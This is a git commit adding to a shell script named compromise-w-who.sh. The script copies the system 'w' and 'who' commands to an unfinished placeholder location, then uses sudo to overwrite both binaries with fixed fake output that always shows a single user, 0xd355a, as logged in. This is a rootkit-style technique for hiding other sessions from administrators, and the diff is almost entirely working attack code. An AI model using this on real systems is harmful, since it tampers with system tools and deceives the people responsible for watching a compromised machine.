f035846bdb3a891fc1bad1e1ca6f348888399993
0xd355a <odessarybski@gmail.com>
2026-03-04 11:07:22 -0500

    untested who and w relocate

--- odessa/compromise-w-who.sh
+++ odessa/compromise-w-who.sh
@@ -5,3 +5,15 @@ W_LOC=$(which w)
 WHO_LOC=$(which who)
 cp $W_LOC "TODO END LOCATION"
 cp $WHO_LOC "TODO END LOCATION"
+echo "\
+11:05:20 up 8 min,  1 user,  load average: 1.70, 1.07, 0.52
+USER     TTY       LOGIN@   IDLE   JCPU   PCPU  WHAT
+0xd355a  pts/0     10:58    0.00s  0.32s  0.01s w
+" | sudo tee $W_LOC
+echo "\
+0xd355a               2026-03-04 10:58
+0xd355a  tty8         2026-03-04 10:58
+" | sudo tee $WHO_LOC
+
+W_LOC=""
+WHO_LOC=""
